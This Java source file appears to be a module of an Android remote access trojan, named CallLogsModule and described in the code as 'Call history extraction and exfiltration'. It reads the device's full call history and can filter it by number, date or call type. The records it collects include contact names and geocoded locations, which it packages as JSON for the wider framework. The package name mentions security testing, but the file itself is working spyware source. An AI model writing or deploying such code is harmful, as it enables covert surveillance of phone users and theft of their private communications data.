package com.security.test.rat.modules.exfiltration;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

/**
 * CallLogsModule - Implements call history extraction
 * 
 * Features:
 * - Extract all call logs
 * - Extract calls by phone number
 * - Filter by date range
 * - Filter by call type
 * - Export in various formats
 */
public class CallLogsModule extends RATModule {
    
    private static final String TAG = "CallLogsModule";
    
    private Context context;
    private boolean isInitialized = false;
    
    public CallLogsModule(Context context) {
        super("CallLogsModule", "Call history extraction and exfiltration");
        this.context = context;
    }
    
    @Override
    public boolean initialize() {
        try {
            Log.i(TAG, "Initializing CallLogsModule");
            
            // Check if we have call log permission
            if (context.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) 
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Call log permission not granted");
                return false;
            }
            
            isInitialized = true;
            Log.i(TAG, "CallLogsModule initialized successfully");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize CallLogsModule", e);
            return false;
        }
    }
    
    @Override
    public void cleanup() {
        try {
            isInitialized = false;
            Log.i(TAG, "CallLogsModule cleaned up");
            
        } catch (Exception e) {
            Log.e(TAG, "Error during CallLogsModule cleanup", e);
        }
    }
    
    /**
     * Extract all call logs
     */
    public String extractAllCallLogs() throws Exception {
        if (!isInitialized) {
            throw new Exception("CallLogsModule not initialized");
        }
        
        try {
            Log.i(TAG, "Extracting all call logs");
            
            List<CallLogEntry> callLogs = getAllCallLogs();
            JSONArray callLogsArray = new JSONArray();
            
            for (CallLogEntry callLog : callLogs) {
                callLogsArray.put(callLog.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("total_calls", callLogs.size());
            result.put("call_logs", callLogsArray);
            
            Log.i(TAG, "Extracted " + callLogs.size() + " call log entries");
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to extract call logs", e);
            throw e;
        }
    }
    
    /**
     * Extract call logs by phone number
     */
    public String extractCallLogsByNumber(String phoneNumber) throws Exception {
        if (!isInitialized) {
            throw new Exception("CallLogsModule not initialized");
        }
        
        try {
            Log.i(TAG, "Extracting call logs for number: " + phoneNumber);
            
            List<CallLogEntry> callLogs = getCallLogsByNumber(phoneNumber);
            JSONArray callLogsArray = new JSONArray();
            
            for (CallLogEntry callLog : callLogs) {
                callLogsArray.put(callLog.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("phone_number", phoneNumber);
            result.put("total_calls", callLogs.size());
            result.put("call_logs", callLogsArray);
            
            Log.i(TAG, "Extracted " + callLogs.size() + " call log entries for " + phoneNumber);
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to extract call logs by number", e);
            throw e;
        }
    }
    
    /**
     * Extract call logs by date range
     */
    public String extractCallLogsByDateRange(long startDate, long endDate) throws Exception {
        if (!isInitialized) {
            throw new Exception("CallLogsModule not initialized");
        }
        
        try {
            Log.i(TAG, "Extracting call logs from " + startDate + " to " + endDate);
            
            List<CallLogEntry> callLogs = getCallLogsByDateRange(startDate, endDate);
            JSONArray callLogsArray = new JSONArray();
            
            for (CallLogEntry callLog : callLogs) {
                callLogsArray.put(callLog.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("start_date", startDate);
            result.put("end_date", endDate);
            result.put("total_calls", callLogs.size());
            result.put("call_logs", callLogsArray);
            
            Log.i(TAG, "Extracted " + callLogs.size() + " call log entries in date range");
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to extract call logs by date range", e);
            throw e;
        }
    }
    
    /**
     * Extract call logs by type
     */
    public String extractCallLogsByType(int callType) throws Exception {
        if (!isInitialized) {
            throw new Exception("CallLogsModule not initialized");
        }
        
        try {
            Log.i(TAG, "Extracting call logs by type: " + getCallTypeString(callType));
            
            List<CallLogEntry> callLogs = getCallLogsByType(callType);
            JSONArray callLogsArray = new JSONArray();
            
            for (CallLogEntry callLog : callLogs) {
                callLogsArray.put(callLog.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("call_type", getCallTypeString(callType));
            result.put("total_calls", callLogs.size());
            result.put("call_logs", callLogsArray);
            
            Log.i(TAG, "Extracted " + callLogs.size() + " call log entries of type " + getCallTypeString(callType));
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to extract call logs by type", e);
            throw e;
        }
    }
    
    /**
     * Get all call logs
     */
    private List<CallLogEntry> getAllCallLogs() {
        List<CallLogEntry> callLogs = new ArrayList<>();
        
        try {
            Uri uri = CallLog.Calls.CONTENT_URI;
            String[] projection = {
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.CACHED_NUMBER_TYPE,
                CallLog.Calls.CACHED_NUMBER_LABEL,
                CallLog.Calls.GEOCODED_LOCATION
            };
            
            String sortOrder = CallLog.Calls.DATE + " DESC";
            
            Cursor cursor = context.getContentResolver().query(
                uri, projection, null, null, sortOrder
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String id = cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID));
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    long duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    String cachedName = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    int cachedNumberType = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.CACHED_NUMBER_TYPE));
                    String cachedNumberLabel = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));
                    String geocodedLocation = cursor.getString(cursor.getColumnIndex(CallLog.Calls.GEOCODED_LOCATION));
                    
                    CallLogEntry callLog = new CallLogEntry(id, number, type, date, duration);
                    callLog.setCachedName(cachedName);
                    callLog.setCachedNumberType(cachedNumberType);
                    callLog.setCachedNumberLabel(cachedNumberLabel);
                    callLog.setGeocodedLocation(geocodedLocation);
                    
                    callLogs.add(callLog);
                    
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting all call logs", e);
        }
        
        return callLogs;
    }
    
    /**
     * Get call logs by phone number
     */
    private List<CallLogEntry> getCallLogsByNumber(String phoneNumber) {
        List<CallLogEntry> callLogs = new ArrayList<>();
        
        try {
            Uri uri = CallLog.Calls.CONTENT_URI;
            String[] projection = {
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.CACHED_NUMBER_TYPE,
                CallLog.Calls.CACHED_NUMBER_LABEL,
                CallLog.Calls.GEOCODED_LOCATION
            };
            
            String selection = CallLog.Calls.NUMBER + " = ?";
            String[] selectionArgs = { phoneNumber };
            String sortOrder = CallLog.Calls.DATE + " DESC";
            
            Cursor cursor = context.getContentResolver().query(
                uri, projection, selection, selectionArgs, sortOrder
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String id = cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID));
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    long duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    String cachedName = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    int cachedNumberType = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.CACHED_NUMBER_TYPE));
                    String cachedNumberLabel = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));
                    String geocodedLocation = cursor.getString(cursor.getColumnIndex(CallLog.Calls.GEOCODED_LOCATION));
                    
                    CallLogEntry callLog = new CallLogEntry(id, number, type, date, duration);
                    callLog.setCachedName(cachedName);
                    callLog.setCachedNumberType(cachedNumberType);
                    callLog.setCachedNumberLabel(cachedNumberLabel);
                    callLog.setGeocodedLocation(geocodedLocation);
                    
                    callLogs.add(callLog);
                    
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting call logs by number: " + phoneNumber, e);
        }
        
        return callLogs;
    }
    
    /**
     * Get call logs by date range
     */
    private List<CallLogEntry> getCallLogsByDateRange(long startDate, long endDate) {
        List<CallLogEntry> callLogs = new ArrayList<>();
        
        try {
            Uri uri = CallLog.Calls.CONTENT_URI;
            String[] projection = {
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.CACHED_NUMBER_TYPE,
                CallLog.Calls.CACHED_NUMBER_LABEL,
                CallLog.Calls.GEOCODED_LOCATION
            };
            
            String selection = CallLog.Calls.DATE + " BETWEEN ? AND ?";
            String[] selectionArgs = { String.valueOf(startDate), String.valueOf(endDate) };
            String sortOrder = CallLog.Calls.DATE + " DESC";
            
            Cursor cursor = context.getContentResolver().query(
                uri, projection, selection, selectionArgs, sortOrder
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String id = cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID));
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    long duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    String cachedName = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    int cachedNumberType = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.CACHED_NUMBER_TYPE));
                    String cachedNumberLabel = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));
                    String geocodedLocation = cursor.getString(cursor.getColumnIndex(CallLog.Calls.GEOCODED_LOCATION));
                    
                    CallLogEntry callLog = new CallLogEntry(id, number, type, date, duration);
                    callLog.setCachedName(cachedName);
                    callLog.setCachedNumberType(cachedNumberType);
                    callLog.setCachedNumberLabel(cachedNumberLabel);
                    callLog.setGeocodedLocation(geocodedLocation);
                    
                    callLogs.add(callLog);
                    
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting call logs by date range", e);
        }
        
        return callLogs;
    }
    
    /**
     * Get call logs by type
     */
    private List<CallLogEntry> getCallLogsByType(int callType) {
        List<CallLogEntry> callLogs = new ArrayList<>();
        
        try {
            Uri uri = CallLog.Calls.CONTENT_URI;
            String[] projection = {
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.CACHED_NUMBER_TYPE,
                CallLog.Calls.CACHED_NUMBER_LABEL,
                CallLog.Calls.GEOCODED_LOCATION
            };
            
            String selection = CallLog.Calls.TYPE + " = ?";
            String[] selectionArgs = { String.valueOf(callType) };
            String sortOrder = CallLog.Calls.DATE + " DESC";
            
            Cursor cursor = context.getContentResolver().query(
                uri, projection, selection, selectionArgs, sortOrder
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String id = cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID));
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    long duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    String cachedName = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    int cachedNumberType = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.CACHED_NUMBER_TYPE));
                    String cachedNumberLabel = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));
                    String geocodedLocation = cursor.getString(cursor.getColumnIndex(CallLog.Calls.GEOCODED_LOCATION));
                    
                    CallLogEntry callLog = new CallLogEntry(id, number, type, date, duration);
                    callLog.setCachedName(cachedName);
                    callLog.setCachedNumberType(cachedNumberType);
                    callLog.setCachedNumberLabel(cachedNumberLabel);
                    callLog.setGeocodedLocation(geocodedLocation);
                    
                    callLogs.add(callLog);
                    
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting call logs by type: " + callType, e);
        }
        
        return callLogs;
    }
    
    /**
     * Get call type as string
     */
    private String getCallTypeString(int callType) {
        switch (callType) {
            case CallLog.Calls.INCOMING_TYPE:
                return "incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "missed";
            case CallLog.Calls.REJECTED_TYPE:
                return "rejected";
            case CallLog.Calls.BLOCKED_TYPE:
                return "blocked";
            case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                return "answered_externally";
            default:
                return "unknown";
        }
    }
    
    /**
     * Get call log statistics
     */
    public String getCallLogStatistics() throws Exception {
        if (!isInitialized) {
            throw new Exception("CallLogsModule not initialized");
        }
        
        try {
            List<CallLogEntry> allCallLogs = getAllCallLogs();
            
            int totalCalls = allCallLogs.size();
            int incomingCalls = 0;
            int outgoingCalls = 0;
            int missedCalls = 0;
            long totalDuration = 0;
            
            for (CallLogEntry callLog : allCallLogs) {
                if (callLog.getType() == CallLog.Calls.INCOMING_TYPE) {
                    incomingCalls++;
                } else if (callLog.getType() == CallLog.Calls.OUTGOING_TYPE) {
                    outgoingCalls++;
                } else if (callLog.getType() == CallLog.Calls.MISSED_TYPE) {
                    missedCalls++;
                }
                
                totalDuration += callLog.getDuration();
            }
            
            JSONObject stats = new JSONObject();
            stats.put("total_calls", totalCalls);
            stats.put("incoming_calls", incomingCalls);
            stats.put("outgoing_calls", outgoingCalls);
            stats.put("missed_calls", missedCalls);
            stats.put("total_duration_seconds", totalDuration);
            stats.put("average_duration_seconds", totalCalls > 0 ? totalDuration / totalCalls : 0);
            
            return stats.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to get call log statistics", e);
            throw e;
        }
    }
    
    /**
     * Get module status
     */
    public String getStatus() {
        if (!isInitialized) {
            return "Not initialized";
        }
        
        try {
            int totalCalls = getAllCallLogs().size();
            return "Ready - " + totalCalls + " call log entries available";
            
        } catch (Exception e) {
            return "Error getting call log count";
        }
    }
    
    /**
     * Call Log Entry data class
     */
    private static class CallLogEntry {
        private String id;
        private String number;
        private int type;
        private long date;
        private long duration;
        private String cachedName;
        private int cachedNumberType;
        private String cachedNumberLabel;
        private String geocodedLocation;
        
        public CallLogEntry(String id, String number, int type, long date, long duration) {
            this.id = id;
            this.number = number;
            this.type = type;
            this.date = date;
            this.duration = duration;
        }
        
        // Getters and setters
        public String getId() { return id; }
        public String getNumber() { return number; }
        public int getType() { return type; }
        public long getDate() { return date; }
        public long getDuration() { return duration; }
        public String getCachedName() { return cachedName; }
        public void setCachedName(String cachedName) { this.cachedName = cachedName; }
        public int getCachedNumberType() { return cachedNumberType; }
        public void setCachedNumberType(int cachedNumberType) { this.cachedNumberType = cachedNumberType; }
        public String getCachedNumberLabel() { return cachedNumberLabel; }
        public void setCachedNumberLabel(String cachedNumberLabel) { this.cachedNumberLabel = cachedNumberLabel; }
        public String getGeocodedLocation() { return geocodedLocation; }
        public void setGeocodedLocation(String geocodedLocation) { this.geocodedLocation = geocodedLocation; }
        
        /**
         * Get call type as string
         */
        public String getTypeString() {
            switch (type) {
                case CallLog.Calls.INCOMING_TYPE:
                    return "incoming";
                case CallLog.Calls.OUTGOING_TYPE:
                    return "outgoing";
                case CallLog.Calls.MISSED_TYPE:
                    return "missed";
                case CallLog.Calls.REJECTED_TYPE:
                    return "rejected";
                case CallLog.Calls.BLOCKED_TYPE:
                    return "blocked";
                case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                    return "answered_externally";
                default:
                    return "unknown";
            }
        }
        
        /**
         * Convert call log entry to JSON
         */
        public JSONObject toJSON() throws JSONException {
            JSONObject json = new JSONObject();
            json.put("id", id);
            json.put("number", number);
            json.put("type", getTypeString());
            json.put("date", date);
            json.put("duration_seconds", duration);
            json.put("cached_name", cachedName != null ? cachedName : "");
            json.put("cached_number_type", cachedNumberType);
            json.put("cached_number_label", cachedNumberLabel != null ? cachedNumberLabel : "");
            json.put("geocoded_location", geocodedLocation != null ? geocodedLocation : "");
            return json;
        }
    }
}
